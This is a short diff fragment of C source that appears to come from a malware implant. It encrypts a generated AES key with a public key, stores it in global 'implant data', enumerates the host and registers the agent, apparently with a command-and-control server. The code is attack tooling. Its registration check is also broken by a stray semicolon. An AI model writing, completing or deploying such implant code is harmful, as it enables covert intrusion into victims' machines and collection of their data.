@@ -30,17 +30,19 @@ int main()
     sprng_done(prng);
     free(prng);
 
+
     if (ReadPublicKey(&PublicKey, &PublicKeySize) != 0) {
         printf("[error] attempting to read public key\n");
         return -1;
     }
-    EncryptAESKey(SymmetricKey, SymmetricKeySize, PublicKey, PublicKeySize);
 
+    EncryptAESKey(SymmetricKey, SymmetricKeySize, PublicKey, PublicKeySize, &g_ImplantData.EncryptedAESKey, &g_ImplantData.EncryptedAESKeySize);
+    
 
     Enumerate(&g_ImplantData);
    
     
-    if (!RegisterAgent());
+    if (!RegisterAgent(&g_ImplantData));
      
 }
 
